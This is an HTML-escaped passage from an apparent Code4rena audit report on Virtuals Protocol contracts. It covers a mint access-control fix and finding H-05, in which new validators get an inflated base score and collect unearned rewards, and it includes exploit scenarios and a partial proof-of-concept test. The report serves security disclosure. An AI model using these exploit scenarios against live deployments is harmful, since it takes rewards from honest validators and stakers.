create contribution proposal without votes\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003eAllowing only an operator or admin to call the \u003ca href=\"https://github.com/code-423n4/2025-04-virtuals-protocol/blob/28e93273daec5a9c73c438e216dde04c084be452/contracts/contribution/ContributionNft.sol#L65\"\u003e\u003ccode\u003eContributionNft::mint\u003c/code\u003e\u003c/a\u003e should mitigate the issue:\u003c/p\u003e\n\u003cpre class=\"grvsc-container dark-default-dark\" data-language=\"\" data-index=\"22\"\u003e\u003ccode class=\"grvsc-code\"\u003e\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003erequire(_msgSender() == _admin, \u0026quot;Only admin can set elo calculator\u0026quot;);\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\n\u003cpre class=\"grvsc-container dark-default-dark\" data-language=\"diff\" data-index=\"23\"\u003e\u003ccode class=\"grvsc-code\"\u003e\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    function mint(\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        address to,\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        uint256 virtualId,\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        uint8 coreId,\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        string memory newTokenURI,\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        uint256 proposalId,\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        uint256 parentId,\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        bool isModel_,\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        uint256 datasetId\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    ) external returns (uint256) {\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk7\"\u003e+       require(_msgSender() == _admin, \u0026quot;Only admin can mint tokens\u0026quot;); \u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        IGovernor personaDAO = getAgentDAO(virtualId);\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e\u003cstrong\u003eVirtuals marked as informative\u003c/strong\u003e\u003c/p\u003e\n\u003chr\u003e\n\u003ch2 id=\"h-05-validatorregistryvalidatorscoregetpastvalidatorscore-allows-validator-to-earn-full-rewards-without-actually-engaging-with-the-protocol\" style=\"position:relative;\"\u003e\u003ca href=\"#h-05-validatorregistryvalidatorscoregetpastvalidatorscore-allows-validator-to-earn-full-rewards-without-actually-engaging-with-the-protocol\" aria-label=\"h 05 validatorregistryvalidatorscoregetpastvalidatorscore allows validator to earn full rewards without actually engaging with the protocol permalink\" class=\"anchor before\"\u003e\u003csvg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"\u003e\u003cpath fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"\u003e\u003c/path\u003e\u003c/svg\u003e\u003c/a\u003e\u003ca href=\"https://code4rena.com/audits/2025-04-virtuals-protocol/submissions/F-83\"\u003e[H-05] \u003ccode\u003eValidatorRegistry::validatorScore/getPastValidatorScore\u003c/code\u003e allows validator to earn full rewards without actually engaging with the protocol\u003c/a\u003e\u003c/h2\u003e\n\u003cp\u003e\u003cem\u003eSubmitted by \u003ca href=\"https://code4rena.com/audits/2025-04-virtuals-protocol/submissions/S-778\"\u003eoakcobalt\u003c/a\u003e, also found by \u003ca href=\"https://code4rena.com/audits/2025-04-virtuals-protocol/submissions/S-188\"\u003edanzero\u003c/a\u003e and \u003ca href=\"https://code4rena.com/audits/2025-04-virtuals-protocol/submissions/S-775\"\u003eYouCrossTheLineAlfie\u003c/a\u003e\u003c/em\u003e\u003c/p\u003e\n\u003cp\u003eThe \u003ccode\u003eValidatorRegistry::_initValidatorScore\u003c/code\u003e function initializes new validators with a base score equal to the total number of proposals that have ever existed, allowing validators to earn full rewards without actually participating in the protocol.\u003c/p\u003e\n\u003ch3 id=\"vulnerabilities\" style=\"position:relative;\"\u003e\u003ca href=\"#vulnerabilities\" aria-label=\"vulnerabilities permalink\" class=\"anchor before\"\u003e\u003csvg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"\u003e\u003cpath fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"\u003e\u003c/path\u003e\u003c/svg\u003e\u003c/a\u003eVulnerabilities\u003c/h3\u003e\n\u003cp\u003eWhen a new validator is added via \u003ccode\u003eaddValidator()\u003c/code\u003e, their base score is set to \u003ccode\u003e_getMaxScore(virtualId)\u003c/code\u003e which is implemented as \u003ccode\u003etotalProposals(virtualId)\u003c/code\u003e in AgentNftV2:\u003c/p\u003e\n\u003cpre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"24\"\u003e\u003ccode class=\"grvsc-code\"\u003e\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk4\"\u003efunction\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk11\"\u003e_initValidatorScore\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    \u003c/span\u003e\u003cspan class=\"mtk12\"\u003euint256\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003evirtualId\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e,\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eaddress\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003evalidator\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e) \u003c/span\u003e\u003cspan class=\"mtk11\"\u003einternal\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e {\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    \u003c/span\u003e\u003cspan class=\"mtk12\"\u003e_baseValidatorScore\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e[\u003c/span\u003e\u003cspan class=\"mtk12\"\u003evalidator\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e][\u003c/span\u003e\u003cspan class=\"mtk12\"\u003evirtualId\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e] = \u003c/span\u003e\u003cspan class=\"mtk11\"\u003e_getMaxScore\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003evirtualId\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e);\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e}\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e\u003ca href=\"https://github.com/code-423n4/2025-04-virtuals-protocol/blob/28e93273daec5a9c73c438e216dde04c084be452/contracts/virtualPersona/ValidatorRegistry.sol#L37\"\u003ehttps://github.com/code-423n4/2025-04-virtuals-protocol/blob/28e93273daec5a9c73c438e216dde04c084be452/contracts/virtualPersona/ValidatorRegistry.sol#L37\u003c/a\u003e\u003c/p\u003e\n\u003cp\u003eThis base score is then added to the validator’s actual participation score in the \u003ccode\u003evalidatorScore\u003c/code\u003e and \u003ccode\u003egetPastValidatorScore\u003c/code\u003e functions:\u003c/p\u003e\n\u003cpre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"25\"\u003e\u003ccode class=\"grvsc-code\"\u003e\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk4\"\u003efunction\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk11\"\u003evalidatorScore\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    \u003c/span\u003e\u003cspan class=\"mtk12\"\u003euint256\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003evirtualId\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e,\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eaddress\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003evalidator\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e) \u003c/span\u003e\u003cspan class=\"mtk11\"\u003epublic\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk11\"\u003eview\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk11\"\u003evirtual\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk11\"\u003ereturns\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e (\u003c/span\u003e\u003cspan class=\"mtk12\"\u003euint256\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e) {\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    \u003c/span\u003e\u003cspan class=\"mtk15\"\u003ereturn\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk12\"\u003e_baseValidatorScore\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e[\u003c/span\u003e\u003cspan class=\"mtk12\"\u003evalidator\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e][\u003c/span\u003e\u003cspan class=\"mtk12\"\u003evirtualId\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e] +\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk11\"\u003e_getScoreOf\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003evirtualId\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk12\"\u003evalidator\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e);\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e}\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e\u003ca href=\"https://github.com/code-423n4/2025-04-virtuals-protocol/blob/28e93273daec5a9c73c438e216dde04c084be452/contracts/virtualPersona/ValidatorRegistry.sol#L41\"\u003ehttps://github.com/code-423n4/2025-04-virtuals-protocol/blob/28e93273daec5a9c73c438e216dde04c084be452/contracts/virtualPersona/ValidatorRegistry.sol#L41\u003c/a\u003e\u003c/p\u003e\n\u003cpre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"26\"\u003e\u003ccode class=\"grvsc-code\"\u003e\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    \u003c/span\u003e\u003cspan class=\"mtk4\"\u003efunction\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk11\"\u003egetPastValidatorScore\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk12\"\u003euint256\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003evirtualId\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e,\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eaddress\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003evalidator\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e,\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk12\"\u003euint256\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003etimepoint\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    ) \u003c/span\u003e\u003cspan class=\"mtk11\"\u003epublic\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk11\"\u003eview\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk11\"\u003evirtual\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk11\"\u003ereturns\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e (\u003c/span\u003e\u003cspan class=\"mtk12\"\u003euint256\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e) {\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk15\"\u003ereturn\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003e_baseValidatorScore\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e[\u003c/span\u003e\u003cspan class=\"mtk12\"\u003evalidator\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e][\u003c/span\u003e\u003cspan class=\"mtk12\"\u003evirtualId\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e] + \u003c/span\u003e\u003cspan class=\"mtk11\"\u003e_getPastScore\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003evirtualId\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk12\"\u003evalidator\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk12\"\u003etimepoint\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e);\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    }\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e\u003ca href=\"https://github.com/code-423n4/2025-04-virtuals-protocol/blob/28e93273daec5a9c73c438e216dde04c084be452/contracts/virtualPersona/ValidatorRegistry.sol#L49\"\u003ehttps://github.com/code-423n4/2025-04-virtuals-protocol/blob/28e93273daec5a9c73c438e216dde04c084be452/contracts/virtualPersona/ValidatorRegistry.sol#L49\u003c/a\u003e\u003c/p\u003e\n\u003cp\u003eIn AgentRewardV2, rewards are distributed based on participation rate calculated as \u003ccode\u003e(validatorRewards * nft.validatorScore(virtualId, validator)) / totalProposals\u003c/code\u003e, meaning validators with artificially inflated scores receive unearned rewards.\u003c/p\u003e\n\u003cp\u003eThis allows two exploit scenarios:\u003c/p\u003e\n\u003col\u003e\n\u003cli\u003eNew validators can earn full rewards without ever voting on proposals:\nWithout actually casting votes, a new validator is already entitled to rewards, because their score is non-zero. This is unfair to other validators who might have started voting from the beginning but missed 1 proposal. (See POC)\u003c/li\u003e\n\u003cli\u003eStakers can game the system by delegating to new validators to maintain 100% reward allocation:\u003c/li\u003e\n\u003c/ol\u003e\n\u003cp\u003eIn addition to the first scenario above, a staker can delegate to a new validator every time to earn 100% uptime without ever having to vote. \u003c/p\u003e\n\u003ch3 id=\"impacts\" style=\"position:relative;\"\u003e\u003ca href=\"#impacts\" aria-label=\"impacts permalink\" class=\"anchor before\"\u003e\u003csvg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"\u003e\u003cpath fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"\u003e\u003c/path\u003e\u003c/svg\u003e\u003c/a\u003eImpacts\u003c/h3\u003e\n\u003cul\u003e\n\u003cli\u003eNew validators can earn full rewards without ever voting on proposals.\u003c/li\u003e\n\u003cli\u003eStakers can game the system by delegating to new validators to maintain 100% reward allocation.\u003c/li\u003e\n\u003cli\u003eUnfair reward distribution that penalizes validators who have actively participated since the beginning.\u003c/li\u003e\n\u003c/ul\u003e\n\u003ch3 id=\"recommended-mitigation-steps-4\" style=\"position:relative;\"\u003e\u003ca href=\"#recommended-mitigation-steps-4\" aria-label=\"recommended mitigation steps 4 permalink\" class=\"anchor before\"\u003e\u003csvg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"\u003e\u003cpath fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"\u003e\u003c/path\u003e\u003c/svg\u003e\u003c/a\u003eRecommended mitigation steps\u003c/h3\u003e\n\u003cp\u003e\u003ccode\u003evalidatorScore\u003c/code\u003e and \u003ccode\u003egetPastValidatorScore\u003c/code\u003e should be based on actual engagement. For example, consider initializing them to 0 and only taking into account scores earned during their engagement.\u003c/p\u003e\n\u003ch3 id=\"proof-of-concept-2\" style=\"position:relative;\"\u003e\u003ca href=\"#proof-of-concept-2\" aria-label=\"proof of concept 2 permalink\" class=\"anchor before\"\u003e\u003csvg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"\u003e\u003cpath fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"\u003e\u003c/path\u003e\u003c/svg\u003e\u003c/a\u003eProof of Concept\u003c/h3\u003e\n\u003cp\u003eUnit test on exploit scenario (1). Suppose 2 proposals are created. validator 1 votes for the 1st proposal: \u003c/p\u003e\n\u003col\u003e\n\u003cli\u003e\u003ccode\u003evalidator2\u003c/code\u003e is initialized. \u003ccode\u003evalidator2\u003c/code\u003e’s \u003ccode\u003eweight == validator1\u003c/code\u003e\u003c/li\u003e\n\u003cli\u003eCheck \u003ccode\u003evalidator2\u003c/code\u003e’s score is 2. (100% uptime). Check \u003ccode\u003evalidator1\u003c/code\u003e’s score is 1. 50% uptime.\u003c/li\u003e\n\u003c/ol\u003e\n\u003cp\u003eSee added unit test \u003ccode\u003evalidators get unearned score, risk of exploits\u003c/code\u003e in \u003ccode\u003etest/rewardsV2.js\u003c/code\u003e:\u003c/p\u003e\n\u003cpre class=\"grvsc-container dark-default-dark\" data-language=\"\" data-index=\"27\"\u003e\u003ccode class=\"grvsc-code\"\u003e\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e  it.only(\u0026quot;validators get unearned score, risk of exploits\u0026quot;, async function () {\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    this.timeout(120000); // 120 seconds\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    //Test setup: 2 proposal are created. validator 1 votes for the 1st proposal.\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    //1. validator2 is initialized. validator2\u0026#39;s weight == validator1\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    //2. check validator2\u0026#39;s score is 2. (100% uptime). check validator1\u0026#39;s score is 1. 50% uptime.\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    const base = await loadFixture(deployWithAgent);\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    const { agentNft, virtualToken, agent } = base;\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    const { founder, contributor1, validator1, validator2 } =\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e      await getAccounts();\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    // Setup - delegate founder\u0026#39;s votes to validator1\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    const veToken = await ethers.getContractAt(\u0026quot;AgentVeToken\u0026quot;, agent.veToken);\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    await veToken.connect(founder).delegate(validator1.address);\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    await mine(1);\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    // Create first proposal and have validator1 vote on it\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    const proposalId1 = await createContribution(\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e      1, // virtualId\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e      0, // coreId\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e      0, // parentId\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e      true, // isModel\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e      0, // no dataset dependency\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e      \u0026quot;First contribution\u0026quot;,\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e      base,\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e      contributor1.address,\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e      [validator1], // Only validator1 votes on this proposal\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e      [1, 1, 1, 1, 1, 1, 1, 1, 1, 1]\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    );\u003c/span\u003e\u003c/span\u003e\n\u003cspan 